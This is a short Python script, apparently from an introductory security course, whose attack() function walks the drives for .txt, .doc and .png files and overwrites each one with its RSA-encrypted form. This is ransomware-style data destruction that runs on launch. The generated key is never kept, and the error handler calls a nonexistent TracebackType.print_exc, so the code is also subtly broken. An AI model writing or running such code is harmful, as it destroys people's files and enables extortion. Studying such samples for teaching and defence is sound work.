
from types import TracebackType
from 安全导论.scan import walk_drivers
import RSA
def encrypt(filename,k):
    try:
        with open(filename,'rb') as f:
            t=f.read()
        c=RSA.RSA_encrypt(t,k[0],k[1])#加密 
        with open(filename, 'wb' )as f:
            f.write(c)#覆盖明文写入密文
    except:
        TracebackType.print_exc()
def attack(formlist=['txt', 'doc', 'png']):
    files=walk_drivers(formlist)
    k=RSA.get_key()
    for filename in files:
        encrypt(filename,k) 
    return len(files)
if __name__=='__main__': 
    l=attack()